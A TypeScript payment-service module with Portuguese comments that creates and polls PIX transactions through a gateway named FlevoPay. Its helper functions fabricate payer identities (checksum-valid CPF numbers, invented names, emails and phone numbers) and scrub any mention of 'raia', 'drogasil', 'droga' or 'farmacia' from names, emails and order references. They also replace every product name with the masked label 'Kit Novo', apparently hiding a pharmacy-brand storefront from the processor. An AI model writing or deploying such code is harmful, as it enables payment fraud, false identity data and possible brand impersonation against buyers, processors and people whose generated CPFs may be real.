/**
 * FlevoPay Service
 * Integração segura com a API da FlevoPay para pagamentos PIX
 * A Chave de API secreta é mantida exclusivamente no backend/servidor e nunca é exposta no frontend.
 */

export interface FlevoCustomer {
  name: string;
  email: string;
  phone: string;
  document: string; // CPF válido (apenas números)
}

export interface FlevoAddress {
  street?: string;
  number?: string;
  complement?: string;
  neighborhood?: string;
  city?: string;
  state?: string;
  zipcode?: string;
}

export const FLEVO_MASKED_PRODUCT_NAME = 'Kit Novo';

export interface CreateFlevoTransactionParams {
  amount: number; // Em centavos (ex: 1000 = R$ 10,00)
  description?: string;
  reference?: string;
  customer?: Partial<FlevoCustomer>;
  address?: FlevoAddress;
}

export interface FlevoTransactionResponse {
  success: boolean;
  status: string; // 'success'
  payment_status?: string; // 'pending' | 'paid' | 'approved'
  transaction_id: string | number;
  id: string; // Identificador/referência
  qr_code: string; // Código Pix Copia e Cola
  qr_code_base64: string | null; // Imagem base64 do QR code
  amount: number;
  expires_at?: string | null;
  error?: string;
}

export interface FlevoStatusResponse {
  success: boolean;
  status: 'pending' | 'approved' | 'paid' | 'processing' | 'under_review' | 'failed' | 'refunded' | 'chargeback' | string;
  id?: string | number;
  external_id?: string;
  amount?: number;
  amount_in_reais?: string;
  raw?: any;
  error?: string;
}

/**
 * Gera um CPF matematicamente válido de acordo com os critérios da Receita Federal do Brasil.
 * Retorna string de 11 dígitos numéricos.
 */
export function generateValidCPF(): string {
  const digits: number[] = [];
  for (let i = 0; i < 9; i++) {
    digits.push(Math.floor(Math.random() * 10));
  }

  // Evita CPFs com todos os dígitos iguais (ex: 111.111.111-11)
  if (digits.every((d) => d === digits[0])) {
    digits[8] = (digits[8] + 1) % 10;
  }

  // Primeiro dígito verificador
  let sum1 = 0;
  for (let i = 0; i < 9; i++) {
    sum1 += digits[i] * (10 - i);
  }
  const rem1 = sum1 % 11;
  const d1 = rem1 < 2 ? 0 : 11 - rem1;
  digits.push(d1);

  // Segundo dígito verificador
  let sum2 = 0;
  for (let i = 0; i < 10; i++) {
    sum2 += digits[i] * (11 - i);
  }
  const rem2 = sum2 % 11;
  const d2 = rem2 < 2 ? 0 : 11 - rem2;
  digits.push(d2);

  return digits.join('');
}

const BRAZILIAN_FIRST_NAMES = [
  'Lucas', 'Gabriel', 'Mateus', 'Rodrigo', 'Bruno', 'Felipe', 'Rafael',
  'Guilherme', 'Mariana', 'Juliana', 'Camila', 'Beatriz', 'Larissa',
  'Fernanda', 'Carolina', 'Amanda', 'Thiago', 'Leonardo', 'Vinicius'
];

const BRAZILIAN_LAST_NAMES = [
  'Silva', 'Santos', 'Oliveira', 'Souza', 'Rodrigues', 'Ferreira', 'Alves',
  'Pereira', 'Lima', 'Gomes', 'Costa', 'Ribeiro', 'Martins', 'Carvalho',
  'Mendes', 'Barbosa', 'Monteiro', 'Araujo'
];

const EMAIL_DOMAINS = ['gmail.com', 'outlook.com', 'hotmail.com', 'yahoo.com.br'];

/**
 * Remove acentos e caracteres especiais para formato de email
 */
function slugifyName(text: string): string {
  return text
    .normalize('NFD')
    .replace(/[\u0300-\u036f]/g, '')
    .toLowerCase()
    .replace(/[^a-z0-9]/g, '');
}

/**
 * Gera dados de cliente realistas e válidos com base no nome do usuário ou nomes brasileiros naturais.
 */
export function generateRealisticCustomer(
  preferredName?: string,
  preferredEmail?: string,
  preferredPhone?: string,
  preferredCpf?: string
): FlevoCustomer {
  // Nome do cliente
  let fullName = preferredName?.trim();
  const invalidNameKeywords = ['casa', 'trabalho', 'apto', 'apartamento', 'outro', 'entrega', 'minha casa', 'raia', 'droga', 'drogaria', 'farmacia', 'farma', 'portal'];
  if (!fullName || fullName.length < 3 || invalidNameKeywords.some((k) => fullName!.toLowerCase().includes(k))) {
    const fn = BRAZILIAN_FIRST_NAMES[Math.floor(Math.random() * BRAZILIAN_FIRST_NAMES.length)];
    const ln1 = BRAZILIAN_LAST_NAMES[Math.floor(Math.random() * BRAZILIAN_LAST_NAMES.length)];
    const ln2 = BRAZILIAN_LAST_NAMES[Math.floor(Math.random() * BRAZILIAN_LAST_NAMES.length)];
    fullName = `${fn} ${ln1} ${ln2}`;
  }

  // E-mail gerado de acordo com o nome do cliente
  let email = preferredEmail?.trim();
  const hasForbiddenEmailDomain = email && (email.includes('raia') || email.includes('farmacia') || email.includes('droga'));
  if (!email || !email.includes('@') || hasForbiddenEmailDomain) {
    const parts = fullName.split(/\s+/).filter(Boolean);
    const firstPart = slugifyName(parts[0] || 'cliente');
    const lastPart = slugifyName(parts[parts.length - 1] || 'silva');
    const randomSuffix = Math.floor(Math.random() * 899 + 100);
    const domain = EMAIL_DOMAINS[Math.floor(Math.random() * EMAIL_DOMAINS.length)];
    email = `${firstPart}.${lastPart}${randomSuffix}@${domain}`;
  }

  // Telefone celular brasileiro válido com DDD (apenas números)
  let phone = preferredPhone ? preferredPhone.replace(/\D/g, '') : '';
  if (phone.length < 10) {
    const ddds = ['11', '19', '21', '31', '41', '51', '61', '71', '81'];
    const ddd = ddds[Math.floor(Math.random() * ddds.length)];
    const num = Math.floor(Math.random() * 89999999 + 10000000);
    phone = `${ddd}9${num}`;
  }

  // CPF válido gerado por algoritmo
  const document = preferredCpf ? preferredCpf.replace(/\D/g, '') : generateValidCPF();

  return {
    name: fullName,
    email,
    phone,
    document: document.length === 11 ? document : generateValidCPF(),
  };
}

/**
 * Gera uma referência externa de pedido totalmente neutra (ex: PED-1791289233422-28414).
 * Não inclui nenhuma menção a "RAIA", "DROGA" ou "FARMACIA".
 */
export function generateGenericReference(customRef?: string): string {
  if (customRef && typeof customRef === 'string') {
    const cleaned = customRef
      .replace(/(?:raia|droga|drogaria|farmacia|farmácia|farma|drogasil|portal)+/gi, 'PED')
      .replace(/(?:PED)+/g, 'PED')
      .replace(/--+/g, '-')
      .trim();
    if (cleaned && cleaned !== 'PED' && cleaned !== 'PED-') {
      return cleaned;
    }
  }
  return `PED-${Date.now()}-${Math.floor(Math.random() * 89999 + 10000)}`;
}

/**
 * Gera um product hash aleatório e único para evitar conflito na criação do pagamento.
 * Requisito: "pra cada produto ou preço gere um product hash com o nome mais aleatorio possivel para nao ter erro na hora de criar o pagamento"
 */
export function generateRandomProductHash(): string {
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let rand = '';
  for (let i = 0; i < 12; i++) {
    rand += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  const timestamp = Date.now().toString(36);
  return `prod_${rand}_${timestamp}`;
}

/**
 * Cria uma transação Pix na FlevoPay através do proxy seguro no backend.
 */
export async function createFlevoPixTransaction(
  params: CreateFlevoTransactionParams
): Promise<FlevoTransactionResponse> {
  const customer = generateRealisticCustomer(
    params.customer?.name,
    params.customer?.email,
    params.customer?.phone,
    params.customer?.document
  );

  const productHash = generateRandomProductHash();
  const reference = generateGenericReference(params.reference);

  const payload = {
    amount: params.amount,
    description: FLEVO_MASKED_PRODUCT_NAME,
    product_name: FLEVO_MASKED_PRODUCT_NAME,
    item_name: FLEVO_MASKED_PRODUCT_NAME,
    reference,
    source: 'api_externa',
    productHash,
    customer,
    address: params.address,
  };

  try {
    const response = await fetch('/api/flevo/transaction', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });

    const data = await response.json();

    if (!response.ok || !data.success) {
      throw new Error(data.error || data.message || `Erro ${response.status} ao comunicar com a FlevoPay`);
    }

    return {
      success: true,
      status: data.data.status || 'success',
      payment_status: data.data.payment_status || 'pending',
      transaction_id: data.data.transaction_id,
      id: data.data.id || reference,
      qr_code: data.data.qr_code,
      qr_code_base64: data.data.qr_code_base64,
      amount: data.data.amount || params.amount,
      expires_at: data.data.expires_at,
    };
  } catch (error: any) {
    console.error('FlevoPay transaction error:', error);
    return {
      success: false,
      status: 'error',
      transaction_id: '',
      id: reference,
      qr_code: '',
      qr_code_base64: null,
      amount: params.amount,
      error: error.message || 'Falha na conexão com gateway de pagamento',
    };
  }
}

/**
 * Consulta o status em tempo real de uma transação na FlevoPay.
 */
export async function checkFlevoPixStatus(
  transactionId: string | number
): Promise<FlevoStatusResponse> {
  if (!transactionId) {
    return { success: false, status: 'unknown', error: 'ID de transação não informado' };
  }

  try {
    const response = await fetch(`/api/flevo/status?id=${encodeURIComponent(String(transactionId))}`);
    const data = await response.json();

    if (!response.ok || !data.success) {
      throw new Error(data.error || 'Erro ao consultar status da transação');
    }

    return {
      success: true,
      status: data.status || 'pending',
      id: data.id,
      external_id: data.external_id,
      amount: data.amount,
      amount_in_reais: data.amount_in_reais,
      raw: data.raw,
    };
  } catch (error: any) {
    console.error('FlevoPay status check error:', error);
    return {
      success: false,
      status: 'error',
      error: error.message || 'Falha ao consultar status',
    };
  }
}
